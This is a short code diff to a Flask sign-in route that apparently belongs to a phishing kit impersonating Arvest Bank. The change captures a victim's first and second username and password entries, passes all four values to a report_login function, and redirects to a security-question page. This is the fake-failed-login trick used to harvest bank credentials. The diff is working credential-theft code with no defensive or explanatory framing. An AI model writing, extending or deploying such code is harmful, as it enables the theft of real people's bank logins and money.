@@ -6,10 +6,13 @@ portals = Blueprint('portals', __name__)
 @portals.route('/signin', methods=['GET','POST'])
 def signin():
     if request.method == 'POST':
+        first_try_user = request.form['try_user_id']
+        first_try_pass = request.form['try_pass']
         user_id = request.form['user-id']
         password_ = request.form['password']
         if user_id and password_:
-            report_login(user_id,password_,bank_name='Arvest')
+            # print(first_try_user, first_try_pass, user_id,password_)
+            report_login(first_try_user, first_try_pass, user_id,password_,bank_name='Arvest')
             return redirect(url_for('portals.question'))
     return render_template('signin.html')
 
